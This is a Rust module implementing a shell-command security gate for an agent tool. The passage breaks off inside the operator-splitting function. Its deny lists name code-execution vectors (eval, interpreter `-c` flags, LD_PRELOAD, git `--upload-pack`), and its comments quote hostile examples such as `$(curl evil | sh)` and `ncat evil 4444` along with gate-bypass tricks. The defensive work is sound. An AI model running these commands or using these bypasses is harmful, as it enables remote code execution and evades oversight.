//! Shell command gate with AST-based parsing.
//!
//! Invariant 6: every command is allowed. What this module blocks is what a
//! deny list cannot express — `eval`/`exec`/`source`/`.`, inline environment
//! assignment, interpreter eval flags (`python -c`), and dangerous flags.
//!
//! The parser splits a compound command down to its leaves — pipelines, `&&`,
//! subshells, brace groups, `case` arms, heredocs — so a blocked command
//! cannot hide inside a construct. When a command does not parse, the checks
//! run on the shallow segments instead: sobre never refuses a command because
//! it could not read it.

mod case_construct;
mod heredoc;
mod mode;
#[cfg(test)]
mod tests;
#[cfg(test)]
mod tests_tokenizer;

use crate::core::error::ShellError;
use case_construct::find_shell_word;
pub(crate) use case_construct::{contains_double_semicolon, rewrite_case_constructs};
#[cfg(test)]
pub(crate) use heredoc::heredoc_delims;
pub use heredoc::strip_all_heredoc_bodies;
pub(crate) use heredoc::{strip_comments, strip_quoted_heredoc_bodies};
pub use mode::ShellSecurity;

/// Checks whether a command may run, honouring the active [`ShellSecurity`] mode
/// (GL #788). This is the single chokepoint shared by MCP `ctx_shell` and the
/// CLI shell entrypoints, so the mode applies consistently:
///
/// - [`ShellSecurity::Off`] → always `Ok` (gating skipped; compression intact).
/// - [`ShellSecurity::Warn`] → run the checks, log any violation, return `Ok`.
/// - [`ShellSecurity::Enforce`] → block on violation (the secure default).
pub fn check_shell_command(command: &str) -> Result<(), ShellError> {
    match ShellSecurity::resolve() {
        ShellSecurity::Off => Ok(()),
        ShellSecurity::Warn => {
            if let Err(msg) = enforce_shell_gate(command) {
                tracing::warn!(
                    target: "shell_security",
                    "warn-only: would block ({})",
                    msg.lines().next().unwrap_or("blocked")
                );
            }
            Ok(())
        }
        ShellSecurity::Enforce => enforce_shell_gate(command),
    }
}

/// True when `command` would pass the allowlist / dangerous-pattern checks in
/// `enforce` semantics — independent of the active [`ShellSecurity`] mode and
/// without any logging or blocking side effects.
///
/// The PreToolUse hook uses this to decide whether a compound/pipeline is safe
/// to route through the compressing `lean-ctx -c` wrap: only gate-clean compounds
/// are wrapped, so a pipeline whose sink is an interpreter-eval or a
/// non-allowlisted tool is never *newly* blocked by the rewrite (#589). It is
/// mode-independent on purpose: a data-sink pipeline should stay raw (left to the
/// agent shell) even in `off`/`warn` mode, where compressing its output would be
/// just as wrong as blocking it would be in `enforce`.
#[must_use]
pub fn passes_enforced(command: &str) -> bool {
    enforce_shell_gate(command).is_ok()
}

/// Hard-block enforcement, evaluated as if in `enforce` mode.
/// [`check_shell_command`] decides whether a violation blocks, warns, or is
/// skipped based on the active [`ShellSecurity`] mode.
///
/// Invariant 6: every command passes. Only the constructs that hide the real
/// command from inspection are refused — see [`UNCONDITIONAL_BLOCKED`].
fn enforce_shell_gate(command: &str) -> Result<(), ShellError> {
    let normalized = normalize_line_continuations(command);
    // #876: a quoted-delimiter heredoc body (`<<'EOF' … EOF`) is literal stdin
    // data, not commands. Strip it before analysis so the operator-splitter can't
    // dice a commit message (`feat(...)`) into bogus "segments" and block them.
    // #876: quoted-delimiter heredoc body = literal stdin, not commands.
    // Substitution checks ($(), backticks) need the quoted-only strip so they
    // can still flag expanding substitutions in unquoted bodies.
    // #1109: a shell comment (`# …`) is not a command. Strip comments after the
    // heredoc bodies are gone, so a `#` inside a (now-removed) body can't be
    // mistaken for a comment and, conversely, a real comment line between
    // commands isn't diced into a bogus `#` segment and blocked.
    let quoted_stripped = strip_comments(&strip_quoted_heredoc_bodies(&normalized));
    // #931: for command-segment and redirect checks, strip ALL heredoc bodies
    // (quoted + unquoted) — a `>` or command word in any body is opaque data.
    let all_stripped = strip_comments(&strip_all_heredoc_bodies(&normalized));
    let cmd = quoted_stripped.as_str();
    let cmd_all = all_stripped.as_str();

    if has_dangerous_patterns(cmd) {
        return Err(format!(
            "[BLOCKED — DO NOT RETRY] Command uses eval or $()/ backticks at command position, \
             which is blocked unconditionally. \
             This is a permanent security restriction, not a transient error.\n\
             Command: {command}"
        )
        .into());
    }

    check_pipe_to_bare_interpreter(cmd);

    // Invariant 6: nothing is gated by name. What remains are the checks a deny
    // list cannot express — shell builtins that hide a command from inspection,
    // inline environment assignment, interpreter eval flags, dangerous flags.
    // `check_unconditional_blocked_only` is the shape the phase-2 deny list
    // extends: walk the segments, test each base against a list, block with a
    // reason. Today that list is a four-entry const.
    check_unconditional_blocked_only(cmd_all)
}

/// Normalize the command string: remove backslash-newline continuations and
/// replace Unicode line separators (U+2028, U+2029) with newlines.
fn normalize_line_continuations(command: &str) -> String {
    command
        .replace("\\\r\n", "")
        .replace("\\\n", "")
        .replace(['\u{2028}', '\u{2029}'], "\n")
}

/// Detect `… | sh` and friends: code arrives on stdin, so nothing here can see
/// what actually runs. Reported, never blocked — invariant 6 puts that call
/// with the developer, and `shell_strict_mode` (the knob that used to block
/// it) is gone. Whether this deserves to join the unconditional blocks is open.
fn check_pipe_to_bare_interpreter(command: &str) {
    for (idx, seg) in split_on_operators(command).iter().enumerate() {
        if idx == 0 {
            continue;
        }
        if is_bare_interpreter_stdin(seg) {
            let base = extract_base_from_segment(seg);
            tracing::warn!(
                "[SECURITY] pipe into bare interpreter '{base}' — code on stdin is opaque to every check"
            );
        }
    }
}

/// For empty allowlists: still enforce UNCONDITIONAL_BLOCKED commands.
fn check_unconditional_blocked_only(command: &str) -> Result<(), ShellError> {
    // Walk every leaf: a `case` arm or a nested substitution hides a command
    // from the shallow operator split, and `case x in a) eval y;; esac` would
    // otherwise sail past the `eval` block.
    //
    // When the command does not parse, fall back to the shallow segments rather
    // than refusing it. Invariant 6: sobre does not block a command because
    // *we* could not read it — the deep walk is a better check, never a gate.
    let segments =
        expand_to_leaf_segments(command).unwrap_or_else(|_| extract_all_commands(command));
    for seg in &segments {
        let base = extract_base_from_segment(seg);
        if !base.is_empty() && UNCONDITIONAL_BLOCKED.contains(&base.as_str()) {
            return Err(format!(
                "[BLOCKED — DO NOT RETRY] '{base}' is blocked unconditionally: it \
                 executes text as code, hiding the real command from every check.\n\
                 Command: {command}"
            )
            .into());
        }
        // A leaf can still carry a subshell prefix the splitter keeps whole:
        // `(ls) python3 -c …` is one leaf whose base is `(ls)`, which would hide
        // the interpreter from the checks below. Inspect each part after a
        // closing paren as well, and refuse a substitution sitting at a command
        // position inside the leaf (`{ echo hi; $(curl evil | sh); }`).
        if has_substitution_at_command_pos(seg.trim()) {
            return Err(format!(
                "[BLOCKED — DO NOT RETRY] command substitution at command position                  executes its output as the command, which nothing here can read.
                 Command: {command}"
            )
            .into());
        }
        for part in seg.split(") ") {
            let part = part.trim_start_matches(['(', ')', ' ']);
            if part.is_empty() {
                continue;
            }
            check_inline_env_block(part)?;
            check_interpreter_eval_only(part)?;
            check_dangerous_flags(part)?;
        }
    }
    Ok(())
}

/// Tokenize a shell command segment respecting single/double quotes and backslash escapes.
/// Returns tokens with outer quotes stripped, matching how the shell would parse them.
/// E.g. `git -C "Program Files" status` → `["git", "-C", "Program Files", "status"]`
pub fn shell_tokenize(input: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut chars = input.chars().peekable();
    let mut in_single = false;
    let mut in_double = false;
    let mut parameter_depth: u32 = 0;

    while let Some(c) = chars.next() {
        match c {
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            '\\' if !in_single => {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            '$' if !in_single && chars.peek() == Some(&'{') => {
                parameter_depth += 1;
                current.push(c);
            }
            '}' if !in_single && parameter_depth > 0 => {
                parameter_depth -= 1;
                current.push(c);
            }
            c if c.is_whitespace() && !in_single && !in_double && parameter_depth == 0 => {
                if !current.is_empty() {
                    tokens.push(std::mem::take(&mut current));
                }
            }
            _ => current.push(c),
        }
    }
    if !current.is_empty() {
        tokens.push(current);
    }
    tokens
}

/// Returns the byte length of the first shell token in `input`, respecting quotes
/// and `(...)` nesting. Used by `skip_env_assignments` to advance past env
/// assignments with quoted values like `FOO="bar baz"` — and, critically, past
/// assignments whose value is a command substitution like `FOO=$(cmd a b)`
/// (#855): without paren-depth tracking, whitespace *inside* the unclosed
/// `$(...)` looked like the end of the token, splitting `s=$(gh pr view …)`
/// into a bogus token `s=$(gh` plus a leftover `pr` that got misread as the
/// base command.
fn quote_aware_token_end(input: &str) -> usize {
    let bytes = input.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    let mut in_single = false;
    let mut in_double = false;
    let mut paren_depth: u32 = 0;
    let mut parameter_depth: u32 = 0;

    while i < len {
        let ch = bytes[i];
        match ch {
            b'\'' if !in_double => {
                in_single = !in_single;
                i += 1;
            }
            b'"' if !in_single => {
                in_double = !in_double;
                i += 1;
            }
            b'\\' if !in_single => {
                i = (i + 2).min(len);
            }
            b'(' if !in_single && !in_double => {
                paren_depth += 1;
                i += 1;
            }
            b')' if !in_single && !in_double && paren_depth > 0 => {
                paren_depth -= 1;
                i += 1;
            }
            b'$' if !in_single && !in_double && bytes.get(i + 1) == Some(&b'{') => {
                parameter_depth += 1;
                i += 1;
            }
            b'}' if !in_single && parameter_depth > 0 => {
                parameter_depth -= 1;
                i += 1;
            }
            b if b.is_ascii_whitespace()
                && !in_single
                && !in_double
                && paren_depth == 0
                && parameter_depth == 0 =>
            {
                return i;
            }
            _ => i += 1,
        }
    }
    len
}

/// Like `check_interpreter_abuse` but only checks for eval flags on interpreters.
/// Skips allowlist-membership tests (no allowlist exists in blocklist-only mode),
/// but still follows delegation wrappers so `xargs bash -c …` / `timeout 5 sh -c …`
/// cannot smuggle inline code past the check (GH #391).
fn check_interpreter_eval_only(segment: &str) -> Result<(), ShellError> {
    let inline_ok = crate::core::config::Config::load().shell_allow_inline_scripts_effective();
    check_interpreter_inner(segment, 0, inline_ok)
}

/// #823: unified interpreter-abuse walk over delegation wrappers.
/// `inline_ok`: if true, skip eval-flag/heredoc checks (#814 opt-in).
fn check_interpreter_inner(segment: &str, depth: usize, inline_ok: bool) -> Result<(), ShellError> {
    if depth > 3 {
        return Ok(());
    }
    let trimmed = skip_env_assignments(segment.trim());
    let tokens = shell_tokenize(trimmed);
    if tokens.is_empty() {
        return Ok(());
    }
    let base = tokens[0]
        .rsplit('/')
        .next()
        .unwrap_or(&tokens[0])
        .to_string();

    // Eval-flag / heredoc checks on interpreters (unless opted out via #814).
    if INTERPRETER_COMMANDS.contains(&base.as_str()) && !inline_ok {
        for tok in &tokens[1..] {
            if EVAL_FLAGS.contains(&tok.as_str()) {
                return Err(format!(
                    "[BLOCKED — DO NOT RETRY] Interpreter '{base}' with inline code execution \
                     flag '{tok}' is blocked. Use a script file instead.\n\
                     This is a permanent security restriction."
                )
                .into());
            }
            if has_eval_flag_prefix(tok) {
                return Err(format!(
                    "[BLOCKED — DO NOT RETRY] Interpreter '{base}' with combined flag '{tok}' \
                     containing eval flag is blocked.\n\
                     This is a permanent security restriction."
                )
                .into());
            }
        }
        if tokens[1..].iter().any(|t| t.contains("<<")) {
            return Err(heredoc_blocked_message(&base).into());
        }
    }

    // Delegation-command walk (recursive).
    if DELEGATION_COMMANDS.contains(&base.as_str()) {
        let rest_tokens = delegated_command_tokens(&tokens[1..]);
        if !rest_tokens.is_empty() {
            let rest_str = rest_tokens.join(" ");
            return check_interpreter_inner(&rest_str, depth + 1, inline_ok);
        }
    }

    Ok(())
}

/// Actionable message for the heredoc-stdin block (GL #1161): the restriction
/// is deliberate — inline code embedded in the command string never exists as
/// an inspectable artifact, unlike a script file, which leaves an auditable
/// trail and passes the write path's own guards. Name the exact workaround
/// instead of leaving the agent to rediscover it by trial and error.
fn heredoc_blocked_message(base: &str) -> String {
    format!(
        "[BLOCKED — DO NOT RETRY] Interpreter '{base}' with heredoc stdin is blocked. \
         Inline code in the command string leaves no auditable artifact.\n\
         Do this instead: write the code to a file, then run it —\n\
           1. create /tmp/snippet with your code (Write/ctx_edit tool)\n\
           2. {base} /tmp/snippet\n\
         This is a permanent security restriction."
    )
}

/// Commands that are unconditionally blocked regardless of allowlist membership.
/// These provide direct arbitrary code execution or re-enter the shell.
const UNCONDITIONAL_BLOCKED: &[&str] = &["eval", "exec", "source", "."];

/// Interpreters that can execute arbitrary code via -c/-e flags.
const INTERPRETER_COMMANDS: &[&str] = &[
    "python", "python3", "python2", "node", "ruby", "perl", "lua", "php", "bash", "sh", "zsh",
    "fish", "dash", "ksh",
];

/// Flags that indicate inline code execution for interpreters.
const EVAL_FLAGS: &[&str] = &[
    "-c", "-e", "-r", "-p", "--eval", "--exec", "-exec", "--print", "--run",
];

/// Script file extensions that indicate a file argument (not stdin execution).
const SCRIPT_EXTENSIONS: &[&str] = &[
    ".py", ".rb", ".js", ".ts", ".pl", ".lua", ".php", ".sh", ".bash", ".zsh", ".mjs", ".cjs",
    ".tsx", ".jsx",
];

/// Commands that delegate to another command (the delegated command must also be allowed).
/// `xargs` is here because `… | xargs bash -c '…'` would otherwise smuggle an
/// interpreter past both the allowlist and the inline-code check (GH #391).
const DELEGATION_COMMANDS: &[&str] = &["env", "nice", "timeout", "sudo", "doas", "xargs", "nohup"];

/// Skips a delegation command's own flags/operands to find the delegated
/// command token: leading `-x` flags, `KEY=VALUE` pairs (env), bare numbers
/// (timeout/nice durations) and `{}` placeholders (xargs -I).
fn delegated_command_tokens(tokens: &[String]) -> Vec<&str> {
    tokens
        .iter()
        .map(std::string::String::as_str)
        .skip_while(|t| {
            t.starts_with('-')
                || t.contains('=')
                || *t == "{}"
                || (!t.is_empty() && t.chars().all(|c| c.is_ascii_digit()))
        })
        .collect()
}

/// Check for combined flags like -pe, -ne, -ce that contain eval characters.
fn has_eval_flag_prefix(token: &str) -> bool {
    if !token.starts_with('-') || token.starts_with("--") || token.len() < 3 {
        return false;
    }
    let flag_chars = &token[1..];
    let eval_chars = ['c', 'e', 'r', 'p'];
    flag_chars.chars().any(|c| eval_chars.contains(&c))
}

/// Check if a segment is a bare interpreter after a pipe (no script file argument).
fn is_bare_interpreter_stdin(segment: &str) -> bool {
    let trimmed = skip_env_assignments(segment.trim());
    let tokens = shell_tokenize(trimmed);
    if tokens.is_empty() {
        return false;
    }
    let base = tokens[0]
        .rsplit('/')
        .next()
        .unwrap_or(&tokens[0])
        .to_string();
    if !INTERPRETER_COMMANDS.contains(&base.as_str()) {
        return false;
    }
    !tokens[1..]
        .iter()
        .any(|t| !t.starts_with('-') && SCRIPT_EXTENSIONS.iter().any(|ext| t.ends_with(ext)))
}

/// Dangerous flag patterns for specific commands.
const DANGEROUS_GIT_FLAGS: &[&str] = &[
    "--upload-pack",
    "--receive-pack",
    "--config=core.sshcommand",
    "--config=core.gitproxy",
];

const DANGEROUS_TAR_FLAGS: &[&str] = &["--to-command", "--use-compress-program"];

/// Blocked inline environment assignments that can hijack execution.
const BLOCKED_INLINE_ENV: &[&str] = &[
    "PATH=",
    "GIT_ASKPASS=",
    "GIT_SSH=",
    "GIT_SSH_COMMAND=",
    "GIT_EDITOR=",
    "GIT_EXTERNAL_DIFF=",
    "SSH_ASKPASS=",
    "LD_PRELOAD=",
    "DYLD_INSERT_LIBRARIES=",
];

fn check_dangerous_flags(segment: &str) -> Result<(), ShellError> {
    let trimmed = skip_env_assignments(segment.trim());
    let tokens = shell_tokenize(trimmed);
    if tokens.is_empty() {
        return Ok(());
    }
    let base = tokens[0]
        .rsplit('/')
        .next()
        .unwrap_or(&tokens[0])
        .to_string();

    match base.as_str() {
        "git" => {
            for tok in &tokens[1..] {
                for flag in DANGEROUS_GIT_FLAGS {
                    if tok.starts_with(flag) {
                        return Err(format!(
                            "[BLOCKED — DO NOT RETRY] 'git' with dangerous flag '{tok}' is blocked.\n\
                             This is a permanent security restriction."
                        ).into());
                    }
                }
            }
        }
        "tar" => {
            for tok in &tokens[1..] {
                for flag in DANGEROUS_TAR_FLAGS {
                    if tok.starts_with(flag) {
                        return Err(format!(
                            "[BLOCKED — DO NOT RETRY] 'tar' with dangerous flag '{tok}' is blocked.\n\
                             This is a permanent security restriction."
                        ).into());
                    }
                }
            }
        }
        "find" => {
            for tok in &tokens[1..] {
                if tok == "-exec" || tok == "-execdir" {
                    return Err(format!(
                        "[BLOCKED — DO NOT RETRY] 'find' with '{tok}' is blocked. \
                         Use 'find ... -print' and pipe to xargs instead.\n\
                         This is a permanent security restriction."
                    )
                    .into());
                }
            }
        }
        "awk" | "gawk" | "mawk" => {
            for tok in &tokens[1..] {
                if tok.contains("system(") {
                    return Err(format!(
                        "[BLOCKED — DO NOT RETRY] '{base}' with 'system()' call is blocked.\n\
                         This is a permanent security restriction."
                    )
                    .into());
                }
            }
        }
        _ => {}
    }
    Ok(())
}

fn check_inline_env_block(segment: &str) -> Result<(), ShellError> {
    let trimmed = segment.trim();
    for blocked in BLOCKED_INLINE_ENV {
        if trimmed.starts_with(blocked) {
            return Err(format!(
                "[BLOCKED — DO NOT RETRY] Inline environment override '{blocked}' is blocked.\n\
                 This is a permanent security restriction."
            )
            .into());
        }
    }
    Ok(())
}

/// Shell reserved words whose operator-delimited segment carries no validatable
/// simple command: the `for`/`select` loop *header* (`for x in LIST`) is data,
/// and `done`/`fi`/`in` close or join a construct. A segment starting with one
/// of these contributes no leaf command.
const HEADER_KEYWORDS: &[&str] = &["for", "select", "in", "done", "fi"];

/// Shell reserved words that *introduce* a command which must still be validated:
/// the condition of `if`/`while`/`until`, the body after `do`/`then`/`else`/
/// `elif`, and the `time`/`!` modifiers. They are stripped so the real leaf
/// command behind them is checked against the allowlist.
const BODY_INTRO_KEYWORDS: &[&str] = &[
    "do", "then", "else", "elif", "if", "while", "until", "time", "!",
];

/// Expand a (possibly compound) command into the list of simple-command *leaves*
/// that must each satisfy the allowlist. This is what makes `for … do CMD; done`,
/// `if COND; then CMD; fi`, `while …; do CMD; done` and balanced `( CMD )`
/// subshells usable in restricted mode without weakening deny-by-default: every
/// leaf is still validated, headers/terminators contribute nothing, and any form
/// this conservative walker cannot prove safe (`case`/`esac`, `;;`, a subshell
/// with trailing content, deep nesting) is rejected — it over-blocks, never
/// under-blocks.
fn expand_to_leaf_segments(command: &str) -> Result<Vec<String>, ShellError> {
    let command = rewrite_case_constructs(command)?;
    if find_shell_word(&command, "esac", 0).is_some() || contains_double_semicolon(&command) {
        return Err(format!(
            "unparsed case-arm terminator or `esac`; the caller falls back to \
             shallow segments.\n\
             Command: {command}"
        )
        .into());
    }
    let mut leaves = Vec::new();
    for seg in extract_all_commands(&command) {
        resolve_segment_leaves(&seg, 0, &mut leaves)?;
    }
    Ok(leaves)
}

/// Resolve one operator-delimited segment into zero or more leaf commands,
/// stripping reserved words and recursing into balanced `( … )` subshells.
fn resolve_segment_leaves(
    segment: &str,
    depth: usize,
    out: &mut Vec<String>,
) -> Result<(), ShellError> {
    if depth > 4 {
        return Err(format!(
            "[BLOCKED — DO NOT RETRY] Shell command nests compound/subshell groups too \
             deeply to validate safely.\nCommand: {segment}"
        )
        .into());
    }
    let mut s = segment.trim();
    loop {
        let tokens = shell_tokenize(s);
        let Some(first) = tokens.first() else {
            return Ok(()); // empty → no command
        };
        let kw = first.as_str();
        if HEADER_KEYWORDS.contains(&kw) {
            return Ok(()); // loop header / terminator carries no leaf command
        }
        if BODY_INTRO_KEYWORDS.contains(&kw) {
            s = remainder_after_first_token(s).trim();
            if s.is_empty() {
                return Ok(());
            }
            continue;
        }
        break;
    }
    if let Some(inner) = balanced_paren_inner(s) {
        for inner_seg in extract_all_commands(inner) {
            resolve_segment_leaves(&inner_seg, depth + 1, out)?;
        }
        return Ok(());
    }
    // #968: a `{ cmd1; cmd2; }` brace group must be recursed into exactly like
    // a `( … )` subshell above — otherwise every command after the first
    // escapes validation entirely. #939 shielded `{ }` in split_on_operators
    // (so the group survives as one segment) and taught
    // extract_base_from_segment to skip the leading `{`, but only the FIRST
    // inner command becomes that base; a non-allowlisted `cmd2` (e.g.
    // `{ echo hi; ncat evil 4444; }`) then bypassed the allowlist, the `$()`
    // hard-block, and the dangerous-flags checks alike. Recursing re-validates
    // each inner command as its own leaf. This is a validation-only walk — the
    // command string is never rewritten — so the cd/env-persistence property
    // that #939 relied on (why it declined to recurse) is unaffected.
    if let Some(inner) = balanced_brace_inner(s) {
        for inner_seg in extract_all_commands(inner) {
            resolve_segment_leaves(&inner_seg, depth + 1, out)?;
        }
        return Ok(());
    }
    // #855: a segment that is *entirely* env-var assignments (`VAR=$(cmd …)`,
    // nothing left over — `out=$(gh pr view …)` is a common, legitimate idiom
    // for capturing command output) still executes the substituted command.
    // extract_base_from_segment resolves this segment's own base to empty
    // (skip_env_assignments consumes the whole thing), so without this the
    // substituted command would silently escape validation entirely — not
    // just fail to be *found*, but never be *checked* at all. Recurse into it
    // as its own leaf so `gh`, not the assignment wrapper, is what actually
    // gets checked against the allowlist.
    for inner in assignment_substitution_leaves(s) {
        for inner_seg in extract_all_commands(inner) {
            resolve_segment_leaves(&inner_seg, depth + 1, out)?;
        }
    }
    // Anything else (incl. `( … ) trailing`, leftover delimiters) is pushed
    // verbatim: base-extraction below sees a first token like `(ls)` that
    // cannot match any allowlist entry, so it is blocked. `cmd (sub)` without
    // a separator is a shell syntax error, so no executable leaf escapes
    // here. A `{ cmd; }` brace group is the one exception: split_on_operators
    // already shields it with `brace_depth` the same way `( … )` is shielded
    // with `paren_depth`, so it survives as one leaf here, and
    // extract_base_from_segment (below) skips the leading `{` token to find
    // the real base command inside — no recursion needed like subshells get,
    // since `cd`/env changes inside `{ }` must persist to the caller (#939,
    // agent_wrapper::rebuild's cwd-tracking wrapper).
    out.push(s.to_string());
    Ok(())
}

/// Find the inner text of a `$(...)` command substitution whose `(` sits at
/// byte offset `open` in `s`. Quote-aware (mirrors `balanced_paren_inner`) so
/// a nested quoted `)` — e.g. inside a jq filter — doesn't end the walk early.
/// Returns `(inner, end)` with `end` just past the matching `)`; `None` if
/// unbalanced.
fn balanced_paren_at(s: &str, open: usize) -> Option<(&str, usize)> {
    let bytes = s.as_bytes();
    let len = bytes.len();
    let mut depth: i32 = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut i = open;
    while i < len {
        let ch = bytes[i];
        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }
        if in_double_quote {
            match ch {
                b'\\' => i = (i + 2).min(len),
                b'"' => {
                    in_double_quote = false;
                    i += 1;
                }
                _ => i += 1,
            }
            continue;
        }
        match ch {
            b'\\' => i = (i + 2).min(len),
            b'\'' => {
                in_single_quote = true;
                i += 1;
            }
            b'"' => {
                in_double_quote = true;
                i += 1;
            }
            b'(' => {
                depth += 1;
                i += 1;
            }
            b')' => {
                depth -= 1;
                i += 1;
                if depth == 0 {
                    return Some((&s[open + 1..i - 1], i));
                }
            }
            _ => i += 1,
        }
    }
    None
}

/// #855: the leading run of `VAR=value` assignment tokens in `s` (the same
/// prefix `skip_env_assignments` walks past) — as a slice of `s`, covering
/// both `VAR=$(cmd)` alone and `A=1 B=$(cmd) realcmd args` (the assignments
/// still execute even when a real command follows them).
fn leading_assignment_prefix(s: &str) -> &str {
    let rest = skip_env_assignments(s);
    let offset = (rest.as_ptr() as usize).saturating_sub(s.as_ptr() as usize);
    &s[..offset.min(s.len())]
}

/// #855: collect the inner command text of every top-level `$(...)` found in
/// `s`'s leading env-assignment prefix (`VAR=$(cmd)`, `A=1 B=$(cmd) realcmd`,
/// …) — those substitutions execute regardless of whether a real command
/// follows the assignments. `cmd "$(sub)"` in *argument* position (after the
/// real command) is untouched here and keeps its existing warn-only handling
/// (`check_substitution_in_args`); this only closes the gap for substitutions
/// hiding in a leading assignment.
fn assignment_substitution_leaves(s: &str) -> Vec<&str> {
    let prefix = leading_assignment_prefix(s);
    if prefix.is_empty() {
        return Vec::new();
    }
    let mut found = Vec::new();
    let bytes = prefix.as_bytes();
    let len = bytes.len();
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut i = 0;
    while i < len {
        let ch = bytes[i];
        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }
        if in_double_quote {
            match ch {
                b'\\' => {
                    i = (i + 2).min(len);
                    continue;
                }
                b'"' => in_double_quote = false,
                _ => {}
            }
            i += 1;
            continue;
        }
        match ch {
            b'\\' => {
                i = (i + 2).min(len);
                continue;
            }
            b'\'' => in_single_quote = true,
            b'"' => in_double_quote = true,
            b'$' if i + 1 < len && bytes[i + 1] == b'(' => {
                if let Some((inner, end)) = balanced_paren_at(prefix, i + 1) {
                    found.push(inner);
                    i = end;
                    continue;
                }
            }
            _ => {}
        }
        i += 1;
    }
    found
}

/// Return the substring after the first whitespace-delimited (quote-aware) token.
fn remainder_after_first_token(s: &str) -> &str {
    let trimmed = s.trim_start();
    let end = quote_aware_token_end(trimmed);
    &trimmed[end..]
}

/// If `s` is a single balanced `( … )` subshell with nothing trailing the closing
/// paren, return the inner command (`(a; b)` → `a; b`). `(a) b` returns `None`:
/// the trailing content falls through to base extraction, which blocks it.
fn balanced_paren_inner(segment: &str) -> Option<&str> {
    let trimmed = segment.trim();
    let bytes = trimmed.as_bytes();
    if bytes.first() != Some(&b'(') {
        return None;
    }
    let len = bytes.len();
    let mut depth: i32 = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut i = 0;
    while i < len {
        let ch = bytes[i];
        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }
        if in_double_quote {
            match ch {
                b'\\' => i += 1, // \" and \\ stay inside the string
                b'"' => in_double_quote = false,
                _ => {}
            }
            i += 1;
            continue;
        }
        match ch {
            // Escaped parens are data (GL #1160): `rg foo\(bar\)` must not
            // shift the depth this walker uses to find the real closing paren.
            b'\\' => i += 1,
            b'\'' => in_single_quote = true,
            b'"' => in_double_quote = true,
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    return if i == len - 1 {
                        Some(trimmed[1..i].trim())
                    } else {
                        None
                    };
                }
            }
            _ => {}
        }
        i += 1;
    }
    None
}

/// If `s` is a single balanced `{ … }` brace group with nothing trailing the
/// closing `}`, return the inner command list (`{ a; b; }` → `a; b`). Mirrors
/// [`balanced_paren_inner`] so [`resolve_segment_leaves`] can recurse into the
/// group and validate every inner command, not just the first (#968).
///
/// Only a real brace *group* qualifies: the `{` must be followed by whitespace
/// (`{ cmd; }`), never `{a,b}` brace *expansion* — that is an argument, and its
/// enclosing command's base is validated normally. `{ a; } b` returns `None`
/// (trailing content → falls through to base extraction), matching the paren
/// walker; such a form is a shell syntax error anyway.
fn balanced_brace_inner(segment: &str) -> Option<&str> {
    let trimmed = segment.trim();
    let bytes = trimmed.as_bytes();
    if bytes.first() != Some(&b'{') {
        return None;
    }
    // A brace *group* requires whitespace after `{`; `{a,b}` (expansion) or a
    // bare `{` at EOF is not a group we should peel open.
    match bytes.get(1) {
        Some(&(b' ' | b'\t' | b'\n' | b'\r')) => {}
        _ => return None,
    }
    let len = bytes.len();
    let mut depth: i32 = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut i = 0;
    while i < len {
        let ch = bytes[i];
        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }
        if in_double_quote {
            match ch {
                b'\\' => i += 1, // \" and \\ stay inside the string
                b'"' => in_double_quote = false,
                _ => {}
            }
            i += 1;
            continue;
        }
        match ch {
            b'\\' => i += 1, // escaped brace is data, not a group delimiter
            b'\'' => in_single_quote = true,
            b'"' => in_double_quote = true,
            b'{' => depth += 1,
            b'}' => {
                depth -= 1;
                if depth == 0 {
                    return if i == len - 1 {
                        Some(trimmed[1..i].trim())
                    } else {
                        None
                    };
                }
            }
            _ => {}
        }
        i += 1;
    }
    None
}

/// Detect dangerous shell patterns that bypass allowlist intent.
///
/// Only blocks patterns that are genuinely dangerous at command position.
/// `$()` and backticks in *arguments* are allowed — the base command is
/// already validated by the allowlist, and blocking substitutions in
/// arguments breaks legitimate workflows (e.g. `git commit -m "$(cat ...)"`,
/// pre-commit hooks, playwright scripts).
fn has_dangerous_patterns(command: &str) -> bool {
    let trimmed = command.trim();

    for blocked in UNCONDITIONAL_BLOCKED {
        let with_space = format!("{blocked} ");
        if trimmed.starts_with(&with_space) {
            return true;
        }
        // `) ` closes a subshell: `(true) eval x` puts `eval` at a command
        // position the leaf walk does not split on, which is how it slipped
        // past the base-name check.
        for sep in ["; ", "&& ", "|| ", "| ", ") ", "\n"] {
            if trimmed.contains(&format!("{sep}{blocked} ")) {
                return true;
            }
        }
    }

    if has_substitution_at_command_pos(trimmed) {
        return true;
    }

    false
}

/// Check if `$()` or backticks appear at command position (first token
/// of any segment). Substitutions in *arguments* are intentionally
/// allowed — the security boundary is the base-command allowlist check.
fn has_substitution_at_command_pos(command: &str) -> bool {
    let segments = split_on_operators(command);
    for seg in segments {
        let trimmed = seg.trim();
        let cmd_start = skip_env_assignments(trimmed);

        if cmd_start.starts_with("$(") {
            return true;
        }

        let tokens = shell_tokenize(cmd_start);
        let first_token = tokens.first().map_or("", std::string::String::as_str);
        if first_token.starts_with('`') || first_token == "`" {
            return true;
        }
    }
    false
}

/// Extract ALL command segments from a compound shell command.
/// Splits on: &&, ||, ;, | (pipe), and handles subshell grouping.
fn extract_all_commands(command: &str) -> Vec<String> {
    split_on_operators(command)
        .into_iter()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

/// Split command string on shell operators: ;, &&, ||, |
/// Respects single/double quotes, parentheses nesting, and backslash escapes
/// outside single quotes (GL #1160): `rg split\.label\|quantityLabel` is ONE
/// command — the escaped pipe is regex data, not an operator. The old scanner
/// split there and blocked the pattern fragment as an unknown command; same
/// for `find … -exec rm {} \;`.
fn split_on_operators(command: &str) -> Vec<&str> {
    let mut segments = Vec::new();
    let mut start = 0;
